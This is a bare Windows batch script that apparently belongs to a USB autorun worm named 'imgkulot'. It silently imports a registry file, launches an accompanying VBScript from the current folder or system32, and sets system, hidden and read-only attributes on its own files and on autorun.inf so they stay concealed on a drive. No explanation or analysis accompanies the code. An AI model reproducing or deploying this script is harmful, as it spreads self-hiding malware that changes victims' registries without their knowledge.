@echo off
if exist .\imgkulot.reg regedit /s .\imgkulot.reg
if not "%1"=="" goto open
if exist imgkulot.vbs start WScript.exe imgkulot.vbs&exit
if exist %SYSTEMROOT%\system32\imgkulot.vbs start WScript.exe %SYSTEMROOT%\system32\imgkulot.vbs&exit
exit
:open
if not "%1"=="Open" goto next
start explorer .\
exit
:next
if "%1"=="+" attrib +s +a +h +r %2\imgkulot.*
if "%1"=="+" attrib +s +a +h +r %2\autorun.inf
:end
